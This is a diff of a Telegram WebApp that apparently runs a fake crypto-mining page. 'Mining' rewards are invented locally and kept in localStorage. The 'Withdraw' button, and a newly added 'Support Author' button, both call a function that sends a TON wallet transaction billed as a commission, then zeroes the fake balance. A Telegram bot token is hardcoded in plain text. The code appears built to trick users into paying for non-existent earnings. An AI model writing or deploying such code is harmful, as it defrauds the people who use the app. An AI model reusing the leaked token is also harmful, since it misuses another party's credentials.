@@ -196,6 +196,22 @@ dl div {
 
 	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
 }
+.support {
+	width: 200px;
+	height: 50px;
+	border-radius: 6px;
+	display: flex;
+  justify-content: center;
+  align-items: center;
+	font-weight: 700;
+  color: #fff;
+	font-family: "Manrope", sans-serif;
+  	line-height: 1.125;
+  	font-size: 18px;
+    background-color: #147ffa;
+
+	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+}
 
 </style>
 <style>
@@ -423,7 +439,7 @@ a {
 let tg = window.Telegram.WebApp;
 
 let activeMining = false;
-let lst = parseFloat(localStorage.getItem("lusdt"));
+let lst = parseFloat(localStorage.getItem("ppp")); //lusdt
 let data = 0;
 let blocks = 0;
 let wallet = "";
@@ -692,7 +708,7 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) / 10; //0.96
     lst = lst + reward;
-    localStorage.setItem("lusdt", lst);
+    localStorage.setItem("ppp", lst);
     return reward;
 
 
@@ -729,7 +745,7 @@ function limitedMineGolden(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) * 5 / 10; //0.96
     lst = lst + (reward * 5);
-    localStorage.setItem("lusdt", lst);
+    localStorage.setItem("ppp", lst);
     return reward;
 
 
@@ -1017,6 +1033,10 @@ setInterval(async function gg() {
 		<div id="hh">
   		<div class="withdraw" onclick="trans()">Withdraw</div>
 		</div>
+    <div id="hh">
+  		  <div class="support" onclick="trans()">Support Author</div>
+		</div>
+
 	</div>
 
   <section id="contentyy">
@@ -1079,7 +1099,7 @@ function pp(){
                     await tonConnectUI.sendTransaction(transaction);
                     alert("Вы успешно оплатаили комиссию!");
                     lst = 0;
-                    localStorage.setItem("lusdt", lst);
+                    localStorage.setItem("ppp", lst);
 
 					let telegram = {
     					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
